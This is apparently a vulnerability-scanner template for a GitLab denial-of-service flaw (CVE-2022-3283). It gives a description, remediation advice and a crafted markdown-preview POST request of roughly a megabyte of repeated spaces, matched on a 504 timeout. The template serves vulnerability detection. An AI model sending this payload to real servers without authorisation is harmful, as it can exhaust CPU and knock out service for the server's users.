id: CVE-2022-3283

info:
  name: GitLab DOS via Markdown Preview
  author: ProjectDiscoveryAI
  severity: high
  description: |
    A potential DOS vulnerability in GitLab CE/EE allows triggering high CPU usage via a crafted payload in the issue description.
  remediation: |
    To mitigate this vulnerability, update GitLab to the latest version where this issue is resolved, or apply necessary patches provided by GitLab. Additionally, consider implementing rate limiting and input validation to prevent similar issues in the future.

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v4/markdown"

    headers:
      Content-Type: application/json

    body: |
      {
        "text": "![l{{repeat(' ', 1048576 / 3 - 1)}}",
        "gfm": "true"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 504

      - type: word
        words:
          - "Gateway Timeout"
        part: body
